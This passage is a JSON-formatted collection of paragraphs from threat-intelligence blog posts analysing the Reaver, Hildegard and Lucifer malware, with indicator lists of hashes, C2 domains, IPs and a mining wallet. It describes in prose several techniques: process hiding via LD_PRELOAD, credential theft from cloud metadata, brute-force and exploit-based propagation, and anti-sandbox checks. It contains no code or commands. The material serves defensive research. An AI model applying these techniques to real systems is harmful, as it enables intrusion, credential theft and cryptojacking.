                "When the CPlApplet function is loaded, it will begin by decompressing an embedded configuration using the same compression algorithm used previously.",
                "An example of this decompressed configuration may be seen below:"
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 2 Decompressed Reaver configuration"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "This configuration contains multiple pieces of information, including the following:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The malware proceeds to check to see if the original dropped malware file exists.",
                "In the event it does, Reaver will move this file to %TEMP%\\~FJIOW.tmp and delete this new file.",
                "This simply acts as cleanup to ensure original file artifacts no longer reside on the infected machine.",
                "Reaver will then install itself as a service in the event it is running with SeDebugPrivilege privileges.",
                "The service is configured with a name, description, and display name that is provided within the configuration.",
                "Reaver continues to collect various information from the victim machine, including the following:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Reaver encrypts this data using an incremental XOR key and uploads it to the configured remote server on the port specified.",
                "The following example Python code shows how this encryption takes place:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "After this data is exfiltrated, the malware expects 8 bytes of data that contains two DWORDs.",
                "These DWORDs contain both a major command and a sub-command.",
                "The following capabilities have been observed in this payload:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Ties to SunOrcal\nReaver was used concurrently with SunOrcal over the past year, to include two Reaver samples dropped from zip files hosted on a domain also being used as a SunOrcal C2 (www.fyoutside[.]com), and there is also passive DNS overlap amongst the C2s.",
                "Specifically, Reaver to date has used www.tashdqdxp[.]com for C2, which overlaps with www.weryhstui[.]com, another C2 used by SunOrcal samples during the same timeframe.",
                "Both domains have resolved to 98.126.156[.]210.",
                "Several of those same SunOrcal samples were also using www.fyoutside[.]com as an additional C2.",
                "This led to further C2 ties within SunOrcal samples, to include samples beaconing to www.olinaodi[.]com; all of this is shown below in Figure 3.",
                "The latter has been previously reported in activity targeting Hong Kong democracy activists and that activity is in turn tied to a report targeting Tibetan, Hong Kong, and Taiwanese activists, and another blog about targeting Taiwanese activists."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 3. Chart showing overlaps between Reaver and SunOrcal.",
                "All IOCs are in the appendix at the end of this blog."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Conclusion\nThe attackers behind SunOrcal, whose activity dates to at least 2013 and possibly 2010, remain active and are still developing new custom malware to use against their targets.",
                "The new malware, Reaver, appears to have been in the wild since late 2016 with less than a dozen known samples, among which there are three variants.",
                "It is also unique in the fact that its final payload is in a CPL file, a technique which Palo Alto Networks has seen with only 0.006% of all malware samples we have analyzed.",
                "The attackers used both families concurrently from late last year through November 2017 and there is some C2 infrastructure overlap between the two families, as well as links to historical reporting.",
                "We will continue to monitor these attackers for new activity and report as appropriate.",
                "Palo Alto Networks customers are protected by the following:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Appendix\nSHA2556  Reaver.v1\nd560f44188fb56d3abb11d9508e1167329470de19b811163eb1167534722e666\n\nSHA2556  Reaver.v2\n98eb5465c6330b9b49df2e7c9ad0b1164aa5b35423d9e80495a178eb510cdc1c\n05ddbd0506ec95fb460b3994e5b21cdb0418ba4aa406374ca1b91249349b7640\n\nSHA2556  Reaver.v3\n18ac3b14300ecfeed4b64a844c16dccb06b0e3513d0954d6c6182f2ea14e4c92\nc0f8bb77284b96e07cab1c3fab8800b1bbd030720c74628c4ee5666694ef903d\n9213f70bce491991c4cbbbd7dc3e67d3a3d535b965d7064973b35c50f265e59b\n26c234c73e2c3448589c7d4a0cf17f615ad3666541a4e611e2d8b77637205bcf\nae9f158e4886cfdbfb4f1b3b25707d05f6fd873d0be9d8e7334a2c28741228ee\n1fcda755e8fa23d27329e4bc0443a82e1c1e9a6c1691639db256a187365e4db1\nc906250e0a4c457663e37119ebe1efa1e4b97eef1d975f383ac3243f9f09908c\n1813f10bcf74beb582c824c64fff63cb150d178bef93af81d875ca84214307a1\n\nSHA256  SunOrcal\n799139b5278dc2ac24279cc6c3db44f4ef0ea78ee7b721b0ace38fd8018c51ac\n81d887fefdbb0219647991c2b7bddf45c2fede4dc6fc18408f1706e0279615b2\n58312fb742ce881e040e1b5b8555f00a402b8dd4fc886acaae2f862040b3bfc5\n38ea33dab0ba2edd16ecd98cba161c550d1036b253c8666c4110d198948329fb\ncb7c0cf1750baaa11783e93369230ee666b9f3da7298e4d1bb9a07af6a439f2f\n\nC2 domains and IP addresses\nwww.tashdqdxp[.]com\nwww.weryhstui[.]com\nwww.fyoutside[.]com\n\nwww.olinaodi[.]com\n104.148.70[.]217\n98.126.156[.]210"
            ]
        }
    ],
    "1d4915c44f2d670aa3b130f1dde308e5e9bd0e7a": [
        {
            "type": "paragraph",
            "content": [
                "In January 2021, Unit 42 researchers detected a new malware campaign targeting Kubernetes clusters.",
                "The attackers gained initial access via a misconfigured kubelet that allowed anonymous access.",
                "Once getting a foothold into a Kubernetes cluster, the malware attempted to spread over as many containers as possible and eventually launched cryptojacking operations.",
                "Based on the tactics, techniques and procedures (TTP) that the attackers used, we believe this is a new campaign from TeamTNT.",
                "We refer to this new malware as Hildegard, the username of the tmate account that the malware used."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "TeamTNT is known for exploiting unsecured Docker daemons and deploying malicious container images, as documented in previous research (Cetus, Black-T and TeamTNT DDoS).",
                "However, this is the first time we found TeamTNT targeting Kubernetes environments.",
                "In addition to the same tools and domains identified in TeamTNT's previous campaigns, this new malware carries multiple new capabilities that make it more stealthy and persistent.",
                "In particular, we found that TeamTNTs",
                "Hildegard malware:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "We believe that this new malware campaign is still under development due to its seemingly incomplete codebase and infrastructure.",
                "At the time of writing, most of Hildegard's infrastructure has been online for only a month.",
                "The C2 domain borg[.]wtf was registered on Dec. 24, 2020, the IRC server went online on Jan. 9, 2021, and some malicious scripts have been updated frequently.",
                "The malware campaign has ~25.05 KH/s hashing power, and there is 11 XMR (~$1,500) in the wallet."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "There has not been any activity since our initial detection, which indicates the threat campaign may still be in the reconnaissance and weaponization stage.",
                "However, knowing this malware's capabilities and target environments, we have good reason to believe that the group will soon launch a larger-scale attack.",
                "The malware can leverage the abundant computing resources in Kubernetes environments for cryptojacking and potentially exfiltrate sensitive data from tens to thousands of applications running in the clusters."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Palo Alto Networks customers running Prisma Cloud are protected from this threat by the Runtime Protection feature, Cryptominer Detection feature and the Prisma Cloud Compute Kubernetes Compliance Protection, which alerts on an insufficient Kubernetes configuration and provides secure alternatives."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 1 illustrates how the attacker entered, moved laterally and eventually performed cryptojacking in multiple containers."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The indicators of compromise (IOCs) found in each container are listed below.",
                "These files are either shell script or Executable Linkable Format (ELF).",
                "The IOC section at the end of the blog contains the hash and details of each file."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 2 maps the malware campaign's TTP to MITRE ATT&CK tactics.",
                "The following sections will detail the techniques used in each stage."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "kubelet is an agent running on each Kubernetes node.",
                "It takes RESTful requests from various components (mainly kube-apiserver) and performs pod-level operations.",
                "Depending on the configuration, kubelet may or may not accept unauthenticated requests.",
                "Standard Kubernetes deployments come with anonymous access to kubelet by default.",
                "However, most managed Kubernetes services such as Azure Kubernetes Service (AKS), Google Kubernetes Engine (GKE) and Kubernetes operations (Kops) all enforce proper authentication by default."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "We discovered that TeamTNT gained initial access with the Hildegard malware by executing commands on kubelets that allow anonymous access.",
                "This was achieved by accessing the kubelets run command API and executing commands on running containers."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Hildegard uses kubelets API to execute commands inside containers.",
                "The initial commands create a tmate reverse shell that allows the attacker to carry out the subsequent operation.",
                "Unlike the techniques that TeamTNT used in the past, this malware campaign did not pull or run any new container image."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Although Unit 42 researchers have not observed an attempt to perform privilege escalation, the malware dropped two adversarial tools, Peirates and BOtB, which are capable of breaking out of containers via known vulnerabilities or accessing cloud resources via exposed cloud credentials."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "BOtB can perform a container breakout using a known vulnerability such as CVE-2019-5736.",
                "It can also escape from privileged containers that have enabled CAPS and SYSCALLS."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Peirates can gather multiple infrastructures and cloud credentials.",
                "It looks for identity and access management (IAM) credentials from cloud metadata services and service account tokens from the Kubernetes clusters.",
                "With the identified credentials, it then further attempts to move laterally or gain control of the cluster.",
                "While we observed Peirates in use, the container it was executed in had no credentials."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Hildegard uses LD_PRELOAD to hide the malicious process launched inside the containers.",
                "The malware modified the /etc/ld.so.preload file to intercept shared libraries imported functions.",
                "In particular, the malware overwrites two functions: readdir() and readdir64(), which are responsible for returning the directory entries in the file system.",
                "The overwritten functions filter out queries made to directory entries under /proc.",
                "The functions then drop queries with keywords such as tmate, xmrig and ziggy.",
                "This way, when applications try to identify the running processes (by reading files under /proc) in the containers, tmate, xmrig and ziggy will not be found.",
                "Linux tools such as ps, top and many other container monitoring tools will be blinded from these malicious processes."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Hildegard deploys an IRC agent built from the open-source project ziggystartux.",
                "To avoid being detected by automated static analysis tools, the ziggystartux ELF is encrypted and packed in another binary (ziggy).",
                "When the binary is executed, the ziggystartux ELF is decrypted by a hardcoded Advanced Encryption Standard (AES) key and executed in memory."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The malware names the IRC process bioset, which is the name of a well-known Linux kernel process bioset.",
                "If one is only looking at the names of the running processes on a host, one can easily overlook this disguised process."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "DNS Monitoring Bypass\nThe malware modifies the system DNS resolvers and uses Googles public DNS servers to avoid being detected by DNS monitoring tools."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "All the scripts are deleted immediately after being executed.",
                "TeamTNT also uses the history -c command to clear the shell log in every script."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Hildegard searches for credential files on the host, as well as queries metadata for cloud-specific credentials.",
                "The identified credentials are sent back to the C2."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The searched credentials include:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The metadata servers searched:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Hildegard performs several reconnaissance operations to explore the environment."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Hildegard mainly uses the unsecured kubelet to move laterally inside a Kubernetes cluster.",
                "During the discovery stage, the malware finds the exploitable kubelets and the containers these kubelets manage.",
                "The malware then creates C2 channels (tmate or IRC) and deploys malicious crypto miners in these containers.",
                "Although not observed by Unit 42 researchers, the attacker may also move laterally with the stolen credentials."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Once gaining the initial foothold into a container, Hildegard establishes either a tmate session or an IRC channel back to the C2.",
                "It is unclear how TeamTNT chooses and tasks between these two C2 channels, as both can serve the same purpose.",
                "At the time of writing, tmate sessions are the only way the attacker interacts with the compromised containers.",
                "Unit 42 researchers have not observed any commands in the IRC channel.",
                "However, the IRC server's metadata indicates that the server was deployed on Jan. 9, 2021, and there are around 220 clients currently connected to the server."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The most significant impact of the malware is resource hijacking and denial of service (DoS).",
                "The cryptojacking operation can quickly drain the entire systems resources and disrupt every application in the cluster.",
                "The xmrig mining process joins the supportxmr mining pool using the wallet address 428uyvSqdpVZL7HHgpj2T5SpasCcoHZNTTzE3Lz2H5ZkiMzqayy19sYDcBGDCjoWbTfLBnc3tc9rG4Y8gXQ8fJiP5tqeBda.",
                "At the time of writing, the malware campaign has ~25.05 KH/s hashing power and there is 11 XMR (~$1,500) in the wallet."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Unlike a Docker engine that runs on a single host, a Kubernetes cluster typically contains more than one host and every host can run multiple containers.",
                "Given the abundant resources in a Kubernetes infrastructure, a hijacked Kubernetes cluster can be more profitable than a hijacked Docker host.",
                "This new TeamTNT malware campaign is one of the most complicated attacks targeting Kubernetes.",
                "This is also the most feature-rich malware we have seen from TeamTNT so far.",
                "In particular, the threat actor has developed more sophisticated tactics for initial access, execution, defense evasion and C2.",
                "These efforts make the malware more stealthy and persistent.",
                "Although the malware is still under development and the campaign is not yet widely spread, we believe the attacker will soon mature the tools and start a large-scale deployment."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Palo Alto Networks customers running Prisma Cloud are protected from this threat by the Runtime Protection features, Cryptominer Detection and by the Prisma Cloud Compute Kubernetes Compliance Protection, which alerts on an insufficient Kubernetes configuration and provides secure alternatives."
            ]
        }
    ],
    "f59bdcb82e765d041218fbefb2eaf907f02c8bca": [
        {
            "type": "paragraph",
            "content": [
                "On May 29, 2020, Unit 42 researchers discovered a new variant of a hybrid cryptojacking malware from numerous incidents of CVE-2019-9081 exploitation in the wild.",
                "A closer look revealed the malware, which weve dubbed Lucifer, is capable of conducting DDoS attacks and well-equipped with all kinds of exploits against vulnerable Windows hosts.",
                "The first wave of the campaign stopped on June 10, 2020.",
                "The attacker then resumed their campaign on June 11, 2020, spreading an upgraded version of the malware and wreaking havoc.",
                "The sample was compiled on Thursday, June 11, 2020 10:39:47 PM UTC and caught by Palo Alto Networks Next-Generation Firewall.",
                "At the time of writing, the campaigns still ongoing."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Lucifer is quite powerful in its capabilities.",
                "Not only is it capable of dropping XMRig for cryptojacking Monero, its also capable of command and control (C2) operation and self-propagation through the exploitation of multiple vulnerabilities and credential brute-forcing.",
                "Additionally, it drops and runs EternalBlue, EternalRomance, and DoublePulsar backdoor against vulnerable targets for intranet infections."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The exhaustive list of weaponized exploits includes CVE-2014-6287, CVE-2018-1000861, CVE-2017-10271, ThinkPHP RCE vulnerabilities (CVE-2018-20062), CVE-2018-7600, CVE-2017-9791, CVE-2019-9081, PHPStudy Backdoor RCE, CVE-2017-0144, CVE-2017-0145, and CVE-2017-8464.",
                "These vulnerabilities have either high or critical ratings due to their trivial-to-exploit nature and their tremendous impact inflicted on the victim.",
                "Once exploited, the attacker can execute arbitrary commands on the vulnerable device.",
                "In this case, the targets are Windows hosts on both the internet and intranet, given that the attacker is leveraging certutil utility in the payload for malware propagation.",
                "Fortunately, the patches for these vulnerabilities are readily available."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "While the vulnerabilities abused and attack tactics leveraged by this malware are nothing original, they once again deliver a message to all organizations, reminding them why its utterly important to keep systems up-to-date whenever possible, eliminate weak credentials, and have a layer of defenses for assurance."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "At the time of writing this blog, the XMR wallet has paid 0.493527 XMR, which converts to approximately $32 USD."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Palo Alto Networks Next-Generation Firewalls can detect and block all the exploit attempts from this kind of malware family."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "This blog includes a detailed analysis of Lucifer and the comparison of version 1 and version 2."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "A quick note on the name: While the malware author named their malware Satan DDoS, theres another malware, Satan Ransomware, bearing that devious name already.",
                "An alternative alias was given to this malware to avoid confusion.",
                "As a result of staying faithful to the unique strings in the binary, we are calling this Lucifer."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "We identified two versions of Lucifer in our research - we focus first on version 1 and then highlight the changes made to version 2 in the following section."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Lucifer contains three resource sections, each of which contains a binary for a specific purpose.",
                "The X86 resource section contains a UPX-packed x86 version of XMRig 5.5.0.",
                "The X64 resource section contains a UPX-packed x64 version of XMRig 5.5.0.",
                "The SMB section contains a binary, in which theres a lot of Equation Groups exploits like EternalBlue and EternalRomance, and of course the infamous DoublePulsar backdoor implant."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "X86: 8edbcd63def33827bfd63bffce4a15ba83e88908f9ac9962f10431f571ba07a8"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "X64: Ac530d542a755ecce6a656ea6309717ec222c34d7e34c61792f3b350a8a29301"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "SMB: 5214f356f2e8640230e93a95633cd73945c38027b23e76bb5e617c71949f8994"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Upon execution, the malware first decrypts its C2 IP address using a xor-incremental encryption and then creates a mutant, using its C2 IP address as the mutants name."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The decrypted C2 IP address is 122[.]112[.]179[.]189."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The name of the mutant object is \\Sessions\\1\\BaseNamedObjects\\122[.]112[.]179[.]189"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The pseudo-code for the decryption algorithm is shown in the figure below."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The malware then proceeds to persist itself by setting the following registry key values."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\QQMusic - %malware binary path%"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\QQMusic - %malware binary path%"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The binary also uses schtasks to set up itself as a task running periodically, ensuring additional layer of persistence.",
                "The command executed is shown in Figure 2."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Once the malware has persisted itself, it then checks whether theres any existing stratum mining information stored in the following registry key value:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\spreadCpuXmr - %stratum info%"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The mining information stored in this registry key value takes precedence if the data is present and legit.",
                "Otherwise, the malware falls back to its default data embedded in the binary."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The malware enables itself with debug privilege and starts several threads to carry out its operation in concurrent fashion.",
                "The following table summarizes the function of each thread."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Table 1.",
                "Worker Thread Description"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The malware employs different propagation strategies."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The malware scans for both open TCP ports 135 (RPC) and 1433(MSSQL) against the target, be it internal or external, and probes for the credential weakness in attempt to gain unauthorized access."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "If the target has the RPC port open, the malware brute-forces the login using the default username administrator and its embedded password list.",
                "It then copies and runs the malware binary on the remote host upon successful authentication."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "When the malware detects that the target has TCP port 1433 open, it tries to brute-force its way in using its embedded list of usernames and passwords.",
                "Upon successful login, the malware then issues shell commands to download and execute a replica of itself on the victim.",
                "The aforementioned list of usernames and passwords can be found in the appendix section."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "In addition to brute-forcing the credentials, the malware leverages exploitation for self-propagation.",
                "For intranet infection, it drops and runs EternalBlue, EternalRomance, and DoublePulsar backdoor against the target when the target has TCP port 445 (SMB) open.",
                "Upon successful exploitation, certutil is used to propagate the malware."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The following figures show the parameters passed to launch the exploits and the backdoor implant."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "In order to infect external hosts, the malware first generates a non-private IP address, and then probes this randomly-selected victim with HTTP requests over a number of ports.",
                "The list of ports is available in the Appendix.",
                "When the malware receives a valid HTTP response from the victim, it then tries to exploit the target based on the conditions shown in the following table."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Table 2. Exploit conditions and CVEs"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Since the same vulnerability (e.g ThinkPHP RCE) may be triggered in different endpoints (i.e via different URLs), the malware tries all hardcoded URLs against the victim for each vulnerability before it proceeds to the next target or next exploit attempt."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "All the exploits contain the payload that downloads a replica of the malware onto the victim via certutil.",
                "The following figures show examples of the attack traffic."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "After the malware has launched all its worker threads, the malware enters an infinite loop to handle its C2 operation, with a sleep interval of five seconds."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "An example of the initial request to its C2 server is shown in Figure 8."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Once the malware has established a TCP connection with its C2 server on port 15888, the malware saves that same socket for subsequent C2 control as well as the miners status report."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The initial C2 request contains a magic header \\x04\\x02\\x02 and encrypted system information like the host IP address, the system type, system architecture, username, number of processors, and processor frequency.",
                "The malware does a decremental-xor encryption on this piece of information before it sends the encrypted data over the wire.",
                "The encrypted data can be decrypted using the decryption routine described in Figure 1.",
                "For example, the decrypted host IP address in Figure 8 is 192.168.56[.]52.",
                "The decrypted Windows system is Windows 7 64Bit, and the decrypted username is Lebron James."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Unlike its very first C2 request message, the rest of the miners status report messages are actually clear text.",
                "An example packet of the miners status report is shown in Figure 9 below."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Table 3 summarizes the control codes received from the C2 server and their corresponding functionalities."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Table 3. C2 description"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The communication between the cryptojacking bot and its mining server is made by using the Stratum protocol on port 10001 and is controlled by the execution of the spreadXfghij.exe program.",
                "This program accepts different parameters that control configuration settings of the running miner such as username, password, CPU usage, priority, threads, and algorithm names respectively."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The Stratum protocol is mainly used by miner software to connect to a centralized server, which coordinates the workload between the clients.",
                "This protocol satisfies the requirements of the JSON RPC 2.0 specification.",
                "The JSON-RPC requests and responses can be seen in Figure 11."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Version 2 of Lucifer is similar to its predecessor in terms of its overall capabilities and behaviors; It drops XMRig for cryptojacking, handles C2 operation, and propagates itself through exploitation and brute-forcing credentials."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "While version 2 and version 1 share a lot of behavioral similarities, version 2 does have exclusive differences that are worth highlighting."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The malware possesses anti-sandbox capability by checking the username and the computer name of the infected host.",
                "If it finds a match in its predefined list of names as shown in Table 4, the malware halts itself from proceeding further."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Table 4. List of Names"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Lucifer also checks for the presence of following device drivers, DLLs, and virtual devices.",
                "If any of these objects are detected, the malware enters an infinite loop, stopping its execution from going further."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Table 5.",
                "List of Driver Names"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "In addition to its anti-sandbox techniques, version 2 possesses an anti-debugger technique that can thwart the analysis by passing a format string to OutputDebugStringA() and crashing the debugger."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Once Lucifer has passed all the checks, it decrypts its C2 URL and creates a mutex based on its C2 URL.",
                "The new C2 URL is qf2020[.]top, and the decryption algorithm is shown in Figure 1."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Theres an additional LNK resource section, in which theres a CVE-2017-8464 exploit used for infection.",
                "The binaries in the resource section are encrypted using the aforementioned xor-incremental encryption.",
                "The decrypted X86, X64, and SMB binaries are the same as those embedded in version 1 of Lucifer."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "LNK (encrypted): 84b0f2e4d222b0a2e34224e60b66340071e0d03c5f1a2af53b6005a3d739915f"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "LNK (decrypted): 4c729b343ed3186dffdf80a8e3adfea7c2d56a7a06081333030fb4635e09d540"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "SMB (encrypted): F2d9d7703a5983ae3b7767c33ae79de1db093ea30f97d6b16bb5b62f03e99638"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "SMB (decrypted): 5214f356f2e8640230e93a95633cd73945c38027b23e76bb5e617c71949f8994"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "X64 (encrypted): 4365c2ba5505afeab2c479a9c546ed3cbc07ace184fe5019947823018feb4265"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "X64 (decrypted): ac530d542a755ecce6a656ea6309717ec222c34d7e34c61792f3b350a8a29301"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "X86 (encrypted): b6d4b4ef2880238dc8e322c7438f57b69cec6d44c0599875466a1edb8d093e15"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "X86 (decrypted): 8edbcd63def33827bfd63bffce4a15ba83e88908f9ac9962f10431f571ba07a8"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "In contrast to version 1, version 2 of Lucifer has added CVE-2017-8464 to its arsenal and taken out CVE-2018-1000861, CVE-2017-10271, and CVE-2017-9791."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The malware infects its targets through IPC, WMI, SMB, and FTP by brute-forcing the credentials, in addition to MSSQL, RPC, and network shares."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The dropped miners name is also different; its C:\\\\ProgramData\\\\Svchocpu.exe instead of C:\\\\ProgramData\\\\spreadXfghij.exe."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Right before proceeding to its C2 operation, Lucifer checks if the host's default language is 0x804",
                "(zh-CN).",
                "If it is, the malware sets Internet Explorer's Start Page to www[.]yzzswt[.]com, and starts a thread that keeps killing and visiting that URL in Internet Explorer.",
                "The trigger depends on the system's idle time."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "While Lucifer version 2 has new C2 at qf2020[.]top:19370, its C2 operation is still the same."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Lucifer is a new hybrid of cryptojacking and DDoS malware variant that leverages old vulnerabilities to spread and perform malicious activities on Windows platforms.",
                "Applying the updates and patches to the affected software are strongly advised.",
                "The vulnerable software includes Rejetto HTTP File Server, Jenkins, Oracle Weblogic, Drupal, Apache Struts, Laravel framework, and Microsoft Windows.",
                "Strong passwords are also encouraged to prevent dictionary attacks."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Palo Alto Networks customers are protected from the attacks by the following products and services:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "180[.]126[.]161[.]27"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "210[.]112[.]41[.]71"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "1. stratum+tcp://pool.supportxmr.com:3333"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "2. stratum+tcp://gulf.moneroocean.stream:10001"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "122[.]112[.]179[.]189:15888 (version 1)"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "SHA256 - Malware"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "94f0e2aa41e1703e37341cba0601441b2d9fa2e11615cad81ba5c93042c8f58c spread.txt (version 1)"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "SHA256 - Embedded Binaries in the Resource Section"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "8edbcd63def33827bfd63bffce4a15ba83e88908f9ac9962f10431f571ba07a8 X86"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Ac530d542a755ecce6a656ea6309717ec222c34d7e34c61792f3b350a8a29301 X64"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "5214f356f2e8640230e93a95633cd73945c38027b23e76bb5e617c71949f8994 SMB"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "SHA256 - Binaries Extracted from SMB.exe"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "ff8c9d8c6f16a466d8e598c25829ec0c2fb4503b74d17f307e13c28fd2e99b93 Shellcode.ini"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "7417daf85e6215dedfd85ca8bfafcfd643c8afe0debcf983ad4bacdb4d1a6dbc X64.dll"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "de23da87e7fbecb2eaccbb85eeff465250dbca7c0aba01a2766761e0538f90b6 X86.dll"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "f06d02359666b763e189402b7fbf9dfa83ba6f4da2e7d037b3f9aebefd2d5a45 adfw-2.dll"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "c51bce247bee4a6f4cd2d7d45483b5b1d9b53f8cc0e04fb4f4221283e356959d adfw.dll"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "d3db1e56360b25e7f36abb822e03c18d23a19a9b5f198e16c16e06785fc8c5fa cnli-0.dll"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "db0831e19a4e3a736ea7498dadc2d6702342f75fd8f7fbae1894ee2e9738c2b4 cnli-1.dll"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "0439628816cabe113315751e7113a9e9f720d7e499ffdd78acbac1ed8ba35887 coli-0.dll"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "b556b5c077e38dcb65d21a707c19618d02e0a65ff3f9887323728ec078660cc3 crli-0.dll"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "9b8ec5d0c10ccdd3933b7712ba40065d1b0dd3ffa7968fb28ad426cd5eee5001 dmgd-1.dll"
            ]
        },
        {
            "type": "paragraph",
            "content": [
